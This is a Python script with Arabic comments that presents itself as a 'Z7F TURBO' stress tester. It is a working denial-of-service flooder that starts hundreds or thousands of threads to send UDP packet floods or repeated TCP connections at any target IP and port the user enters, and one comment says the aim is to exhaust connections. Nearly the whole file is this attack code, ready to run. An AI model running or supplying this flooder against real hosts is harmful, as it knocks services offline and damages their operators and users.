import socket
import threading
import random
import os
import sys

# الألوان
R, G, Y, B, C, W = '\033[1;31m', '\033[1;32m', '\033[1;33m', '\033[1;34m', '\033[1;36m', '\033[1;37m'

def logo():
    os.system('clear')
    print(f"""
{R}  _______ ______ ______      _______ _    _ _____  ____   ____ 
{R} |__   __|____  |  ____|    |__   __| |  | |  __ \|  _ \ / __ \ 
{R}    | |     / /| |__          | |  | |  | | |__) | |_) | |  | |
{R}    | |    / / |  __|         | |  | |  | |  _  /|  _ <| |  | |
{R}    | |   / /  | |            | |  | |__| | | \ \| |_) | |__| |
{R}    |_|  /_/   |_| {W}Z7F        |_|   \____/|_|  \_\____/ \____/ 
{C}=====================================================================
{Y}        Z7F TURBO V5.0 | HIGH-SPEED PACKET INJECTION
{G}        STRESS TEST MODE: EXTREME | MAX THREADS: 1000+
{C}====================================================================={W}""")

# توليد حزمة بيانات عشوائية ثقيلة
bytes_payload = random._urandom(1490) 

def udp_flood(target_ip, target_port):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) # UDP
    while True:
        try:
            s.sendto(bytes_payload, (target_ip, target_port))
        except:
            pass

def tcp_flood(target_ip, target_port):
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            s.connect((target_ip, target_port))
            s.send(bytes_payload)
            # لا نغلق الاتصال فوراً لنسبب Connection Exhaustion
        except:
            pass

def start_turbo():
    logo()
    target = input(f"{G}Target IP/Domain: {W}")
    try:
        ip = socket.gethostbyname(target)
        port = int(input(f"{G}Target Port (e.g 80 or 443): {W}") or 80)
        t_count = int(input(f"{G}Threads Count (Recommended 1000): {W}") or 1000)
        mode = input(f"{G}Mode [UDP/TCP]: {W}").upper()
        
        print(f"\n{R}[!!!] INJECTING {t_count} TURBO ENGINES ON {ip}:{port} [!!!]{W}")
        
        for i in range(t_count):
            if mode == "UDP":
                thread = threading.Thread(target=udp_flood, args=(ip, port))
            else:
                thread = threading.Thread(target=tcp_flood, args=(ip, port))
            
            thread.daemon = True # لضمان إغلاق الخيوط عند إيقاف البرنامج
            thread.start()
            
            if i % 100 == 0:
                print(f"{C}[+] Engines {i} Active...")

        print(f"\n{G}[SUCCESS] All engines are running at MAX speed.{W}")
        print(f"{Y}Press Ctrl+C to stop the attack.{W}")
        
        # إبقاء الكود يعمل
        while True:
            pass

    except Exception as e:
        print(f"{R}[-] Error: {e}{W}")

if __name__ == "__main__":
    try:
        start_turbo()
    except KeyboardInterrupt:
        print(f"\n{Y}[!] Shutdown Requested. Cleaning up...{W}")
        sys.exit()
